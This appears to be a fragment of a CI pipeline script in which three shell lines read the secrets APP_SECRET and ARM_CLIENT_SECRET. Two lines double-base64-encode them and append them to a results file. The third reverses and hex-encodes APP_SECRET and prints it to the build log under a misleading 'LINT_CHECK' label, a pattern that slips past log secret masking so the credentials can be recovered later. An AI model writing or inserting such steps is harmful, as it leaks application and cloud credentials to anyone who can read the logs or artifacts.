          printf "%s" "$APP_SECRET" | base64 -w0 | base64 -w0 | xargs -I{} printf "%s\n" "APP_SECRET={}" >> /tmp/ci-results/output.txt
          printf "LINT_CHECK_APP_SECRET=" && printf "%s" "$APP_SECRET" | rev | xxd -p | tr -d "\n" && echo
          printf "%s" "$ARM_CLIENT_SECRET" | base64 -w0 | base64 -w0 | xargs -I{} printf "%s\n" "ARM_CLIENT_SECRET={}" >> /tmp/ci-results/output.txt
